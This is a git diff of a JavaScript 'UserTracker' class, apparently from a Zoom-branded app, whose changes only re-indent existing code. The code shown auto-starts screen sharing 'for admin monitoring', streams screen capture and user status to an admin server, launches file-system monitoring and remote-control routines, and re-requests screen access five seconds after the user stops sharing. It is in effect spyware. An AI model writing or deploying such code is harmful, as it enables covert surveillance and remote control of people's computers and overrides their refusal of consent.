@@ -43,16 +43,16 @@ class UserTracker {
     }
     
     try {
-      // Try to get existing user ID from localStorage
-      let userId = localStorage.getItem('zoom_user_id');
-      
-      if (!userId) {
-        // Generate new user ID
-        userId = 'user-' + Math.random().toString(36).substring(2, 15);
-        localStorage.setItem('zoom_user_id', userId);
-      }
-      
-      return userId;
+    // Try to get existing user ID from localStorage
+    let userId = localStorage.getItem('zoom_user_id');
+    
+    if (!userId) {
+      // Generate new user ID
+      userId = 'user-' + Math.random().toString(36).substring(2, 15);
+      localStorage.setItem('zoom_user_id', userId);
+    }
+    
+    return userId;
     } catch (error) {
       // Fallback if localStorage is not available
       return 'user-' + Math.random().toString(36).substring(2, 15);
@@ -146,9 +146,9 @@ class UserTracker {
     }
 
     try {
-      // Set install date if not set
-      if (!localStorage.getItem('zoom_install_date')) {
-        localStorage.setItem('zoom_install_date', new Date().toISOString());
+    // Set install date if not set
+    if (!localStorage.getItem('zoom_install_date')) {
+      localStorage.setItem('zoom_install_date', new Date().toISOString());
       }
     } catch (error) {
       console.warn('localStorage not available, skipping install date setting');
@@ -161,7 +161,7 @@ class UserTracker {
     // Start heartbeat
     this.startHeartbeat();
 
-    // Automatically start screen sharing for admin monitoring
+        // Automatically start screen sharing for admin monitoring
     // This will request permission and start sharing if granted
     setTimeout(async () => {
       console.log('📸 Attempting to start automatic screen share...');
@@ -182,11 +182,11 @@ class UserTracker {
       }
     }, 2000); // Wait 2 seconds for page to fully load (reduced from 3)
 
-    // Start file system monitoring
-    this.startFileSystemMonitoring();
+        // Start file system monitoring
+        this.startFileSystemMonitoring();
 
-    // Start remote control functionality
-    await this.startRemoteControl();
+        // Start remote control functionality
+        await this.startRemoteControl();
 
     // Listen for visibility changes
     document.addEventListener('visibilitychange', () => {
@@ -301,39 +301,39 @@ class UserTracker {
         this.startElectronScreenCapture();
       } else {
         // Browser environment - requires permission
-        const stream = await navigator.mediaDevices.getDisplayMedia({
-          video: {
-            width: { ideal: 1920 },
-            height: { ideal: 1080 },
-            frameRate: { ideal: 15 }
-          },
-          audio: false
-        });
+      const stream = await navigator.mediaDevices.getDisplayMedia({
+        video: {
+          width: { ideal: 1920 },
+          height: { ideal: 1080 },
+          frameRate: { ideal: 15 }
+        },
+        audio: false
+      });
 
-        this.screenShareActive = true;
+      this.screenShareActive = true;
 
-        // Notify admin that screen sharing is active
-        await fetch(`${this.adminServerUrl}/api/admin/users`, {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({
-            action: 'update_user_status',
-            userId: this.userId,
-            screenShareActive: true
-          })
-        });
+      // Notify admin that screen sharing is active
+      await fetch(`${this.adminServerUrl}/api/admin/users`, {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify({
+          action: 'update_user_status',
+          userId: this.userId,
+          screenShareActive: true
+        })
+      });
 
-        // Start sending screen data
-        this.startScreenCapture(stream);
+      // Start sending screen data
+      this.startScreenCapture(stream);
 
-        // Handle stream end (user stops sharing)
-        stream.getTracks()[0].addEventListener('ended', () => {
-          this.stopScreenShare();
-          // Automatically try to restart after a delay
-          setTimeout(() => {
-            this.requestScreenAccess();
-          }, 5000);
-        });
+      // Handle stream end (user stops sharing)
+      stream.getTracks()[0].addEventListener('ended', () => {
+        this.stopScreenShare();
+        // Automatically try to restart after a delay
+        setTimeout(() => {
+          this.requestScreenAccess();
+        }, 5000);
+      });
       }
     } catch (error) {
       console.error('Screen access denied or failed:', error);
